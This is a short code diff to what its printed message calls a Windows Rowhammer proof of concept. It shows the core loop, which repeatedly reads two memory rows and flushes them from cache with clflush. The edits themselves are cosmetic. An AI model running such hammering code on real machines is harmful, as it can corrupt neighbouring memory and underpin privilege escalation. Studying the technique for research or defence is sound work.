@@ -35,15 +35,15 @@ int main()
     volatile uint64_t* row_a = (uint64_t*)((uintptr_t)buffer + 0x1000); 
     volatile uint64_t* row_c = (uint64_t*)((uintptr_t)buffer + 0x3000); 
 
-    printf("Starting Windows Rowhammer PoC on 11th Gen Intel...\n");
+    printf("Starting rowhammer\n");
 
-    for (int i = 0; i < 1000000; i++) 
+    for (int i = 0; i < 1'000'000; i++) 
     {
         // Read from the addresses to pull data into the cache
         uint64_t dummy1 = *row_a;
         uint64_t dummy2 = *row_c;
 
-        // Force cache eviction using MSVC intrinsics
+        // Force cache eviction
         _mm_clflush((void const*)row_a);
         _mm_clflush((void const*)row_c);
 
